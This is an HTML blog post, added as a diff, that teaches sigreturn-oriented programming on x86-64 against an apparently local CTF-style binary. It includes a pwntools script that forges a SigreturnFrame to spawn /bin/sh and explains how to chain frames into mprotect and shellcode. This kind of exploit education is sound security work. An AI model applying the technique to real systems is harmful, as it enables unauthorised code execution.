@@ -1,0 +1,171 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#060606" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#f3f3f3" media="(prefers-color-scheme: light)">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>SROP — one syscall, every register — algoatson.github.io</title>
+<meta name="description" content="A signal return restores the entire CPU state from a frame on the stack. Forge that frame and a single rt_sigreturn sets rax, rdi, rsi, rdx, rip and rsp at once — the densest gadget in the binary, perfect when you have almost nothing to work with.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/srop-one-syscall-every-register/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SROP — one syscall, every register — algoatson.github.io">
+<meta property="og:description" content="A signal return restores the entire CPU state from a frame on the stack. Forge that frame and a single rt_sigreturn sets rax, rdi, rsi, rdx, rip and rsp at once — the densest gadget in the binary, perfect when you have almost nothing to work with.">
+<meta property="og:url" content="https://algoatson.github.io/p/srop-one-syscall-every-register/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/srop-one-syscall-every-register.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="preload" href="/assets/vga.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "SROP — one syscall, every register", "datePublished": "2026-05-22", "dateModified": "2026-05-22", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "A signal return restores the entire CPU state from a frame on the stack. Forge that frame and a single rt_sigreturn sets rax, rdi, rsi, rdx, rip and rsp at once — the densest gadget in the binary, perfect when you have almost nothing to work with.", "url": "https://algoatson.github.io/p/srop-one-syscall-every-register/", "mainEntityOfPage": "https://algoatson.github.io/p/srop-one-syscall-every-register/", "keywords": "pwn, rop"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/series/">series</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>SROP — one syscall, every register</h1>
+  <div class="meta"><span>2026-05-22</span><span>3 min read</span><a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/rop/">rop</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#why-a-signal-return-is-a-gadget">why a signal return is a gadget</a></li>
+<li><a href="#the-recipe">the recipe</a></li>
+<li><a href="#why-its-the-gadget-of-last-resort">why it's the gadget of last resort</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>Sometimes you have a stack overflow and almost no gadgets — a stripped static
+binary, no <code class="highlight">pop rdi</code>, no useful PLT. Sigreturn-oriented programming turns the
+kernel's own signal machinery into the most powerful gadget there is: one syscall
+that loads <strong>every general-purpose register</strong> from memory you control.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./tiny</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>linkage</dt><dd>static, stripped</dd></div><div><dt>gadgets</dt><dd>a &#x27;syscall&#x27; and a way to set rax — that&#x27;s the whole budget</dd></div></dl><ul class="target__mits"><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">NX</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-off"><span class="g" aria-hidden="true">✗</span><span class="mk">PIE</span><span class="lead" aria-hidden="true"></span><span class="mv">off</span></li></ul></div></figure>
+<h2 id="why-a-signal-return-is-a-gadget">why a signal return is a gadget<a class="headerlink" href="#why-a-signal-return-is-a-gadget" title="Permanent link">#</a></h2>
+<p>When the kernel delivers a signal, it pushes a frame onto the stack holding a
+complete snapshot of the CPU — <code class="highlight">rax rdi rsi rdx rsp rip</code>, the lot — so the handler
+can run and the program can resume exactly where it was. Resuming is the syscall
+<code class="highlight">rt_sigreturn</code> (nr <strong>15</strong> on x86-64): it pops that frame and restores <strong>all</strong> of
+it. The kernel doesn't check that a signal was ever actually delivered. So if you
+control the stack and can invoke <code class="highlight">rt_sigreturn</code>, you control the entire register
+file in one shot:</p>
+<figure class="codeblock"><figcaption><span class="fname">rt_sigreturn restores all of this from the stack</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#rt-sigreturn-restores-all-of-this-from-the-stack-1">1</a></span>
+<span class="normal"><a href="#rt-sigreturn-restores-all-of-this-from-the-stack-2">2</a></span>
+<span class="normal"><a href="#rt-sigreturn-restores-all-of-this-from-the-stack-3">3</a></span>
+<span class="normal"><a href="#rt-sigreturn-restores-all-of-this-from-the-stack-4">4</a></span>
+<span class="normal"><a href="#rt-sigreturn-restores-all-of-this-from-the-stack-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="rt-sigreturn-restores-all-of-this-from-the-stack-1">  rdi rsi rdx r8 r9 r10        ; syscall arguments — set them freely
+</span><span id="rt-sigreturn-restores-all-of-this-from-the-stack-2">  rax                          ; the next syscall number
+</span><span id="rt-sigreturn-restores-all-of-this-from-the-stack-3">  rip                          ; where execution continues
+</span><span id="rt-sigreturn-restores-all-of-this-from-the-stack-4">  rsp                          ; pivot the stack while you&#39;re at it
+</span><span id="rt-sigreturn-restores-all-of-this-from-the-stack-5">  cs/ss/eflags                 ; the frame carries these too
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<h2 id="the-recipe">the recipe<a class="headerlink" href="#the-recipe" title="Permanent link">#</a></h2>
+<p>Forge a <code class="highlight">sigcontext</code> frame that sets up an <code class="highlight">execve(&quot;/bin/sh&quot;, 0, 0)</code>: <code class="highlight">rax=59</code>,
+<code class="highlight">rdi=&amp;&quot;/bin/sh&quot;</code>, <code class="highlight">rsi=rdx=0</code>, <code class="highlight">rip=&amp;syscall_gadget</code>. To <em>trigger</em> the sigreturn
+you need <code class="highlight">rax=15</code> and a <code class="highlight">syscall</code>. The cleanest way to land <code class="highlight">rax=15</code> with no
+<code class="highlight">pop rax</code> is the <strong><code class="highlight">read</code> trick</strong> — a <code class="highlight">read()</code> that returns the number of bytes
+you send, so sending exactly 15 bytes leaves <code class="highlight">rax=15</code>:</p>
+<figure class="codeblock"><figcaption><span class="fname">srop.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#sroppy-1"> 1</a></span>
+<span class="normal"><a href="#sroppy-2"> 2</a></span>
+<span class="normal"><a href="#sroppy-3"> 3</a></span>
+<span class="normal"><a href="#sroppy-4"> 4</a></span>
+<span class="normal"><a href="#sroppy-5"> 5</a></span>
+<span class="normal"><a href="#sroppy-6"> 6</a></span>
+<span class="normal"><a href="#sroppy-7"> 7</a></span>
+<span class="normal"><a href="#sroppy-8"> 8</a></span>
+<span class="normal"><a href="#sroppy-9"> 9</a></span>
+<span class="normal"><a href="#sroppy-10">10</a></span>
+<span class="normal"><a href="#sroppy-11">11</a></span>
+<span class="normal"><a href="#sroppy-12">12</a></span>
+<span class="normal"><a href="#sroppy-13">13</a></span>
+<span class="normal"><a href="#sroppy-14">14</a></span>
+<span class="normal"><a href="#sroppy-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="sroppy-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="sroppy-2"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./tiny&quot;</span><span class="p">)</span>
+</span><span id="sroppy-3"><span class="n">syscall</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">&quot;syscall; ret&quot;</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="kc">True</span><span class="p">))</span>
+</span><span id="sroppy-4"><span class="n">binsh</span>   <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>      <span class="c1"># or write it via read() first</span>
+</span><span id="sroppy-5">
+</span><span id="sroppy-6"><span class="hll"><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+</span></span><span id="sroppy-7"><span class="hll"><span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">constants</span><span class="o">.</span><span class="n">SYS_execve</span>              <span class="c1"># 59</span>
+</span></span><span id="sroppy-8"><span class="hll"><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">binsh</span>
+</span></span><span id="sroppy-9"><span class="hll"><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span id="sroppy-10"><span class="hll"><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span id="sroppy-11"><span class="hll"><span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall</span>                            <span class="c1"># execve fires after the restore</span>
+</span></span><span id="sroppy-12">
+</span><span id="sroppy-13"><span class="c1"># overflow -&gt; set rax=15 (rt_sigreturn) -&gt; syscall -&gt; kernel restores `frame`</span>
+</span><span id="sroppy-14"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rax_15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+</span><span id="sroppy-15"><span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">)</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p><code class="highlight">pwntools</code>' <code class="highlight">SigreturnFrame</code> knows the exact byte layout of the frame, so you
+just assign register fields and dump it with <code class="highlight">bytes(frame)</code>.</p>
+<details class="spoiler">
+<summary>from a 'syscall' and nothing else, a shell</summary>
+<p>The forged frame lands <code class="highlight">execve(&quot;/bin/sh&quot;, 0, 0)</code> straight from the kernel's
+restore path:
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">segfault{the_kernel_set_my_registers_for_me}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<h2 id="why-its-the-gadget-of-last-resort">why it's the gadget of last resort<a class="headerlink" href="#why-its-the-gadget-of-last-resort" title="Permanent link">#</a></h2>
+<ul>
+<li>it needs only <strong>one real gadget</strong> — a <code class="highlight">syscall</code> (ideally <code class="highlight">syscall; ret</code>) — plus
+  a way to get <code class="highlight">rax=15</code>. Static binaries are full of <code class="highlight">syscall</code>s;</li>
+<li>the frame is plain data, so a single large overflow both triggers the sigreturn
+  <em>and</em> carries the frame behind it;</li>
+<li>chain it: each <code class="highlight">rt_sigreturn</code> can set <code class="highlight">rip</code> back to your <code class="highlight">syscall</code> and <code class="highlight">rsp</code>
+  forward to the <em>next</em> forged frame, so you can run <code class="highlight">mprotect</code> → shellcode, or any
+  syscall sequence, register-perfect, with no other gadgets at all.</li>
+</ul>
+<p>NX took your shellcode and a sparse binary took your ROP chain — SROP gives both
+back, because the richest "gadget" in any Linux binary is the kernel agreeing to
+restore whatever register state you left lying on the stack.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><div class="row"><span class="row__date">2026-05-12</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/finding-gadgets/">finding gadgets: ROPgadget, ropper, one_gadget, pwntools</a><span class="row__min">5 min</span></div><div class="row"><span class="row__date">2026-05-10</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/ret2dlresolve-no-leak/">ret2dlresolve — a shell with no libc leak</a><span class="row__min">3 min</span></div><div class="row"><span class="row__date">2026-01-29</span><a class="row__tag" href="/tags/pwn/">pwn</a><a class="row__title" href="/p/ret2libc-warmup/">ret2libc on a warm-up: stack smash to shell</a><span class="row__min">4 min</span></div></div></section>
+<nav class="pager"><a class="prev" href="/p/pwntools-cookbook/"><span class="lbl">&#8249; newer</span>a pwntools cookbook</a><a class="next" href="/p/checksec-everything/"><span class="lbl">older &#8250;</span>one keybind to checksec everything</a></nav></main>
+
+    <footer class="status">
+      <span>36 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h2>keys</h2><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
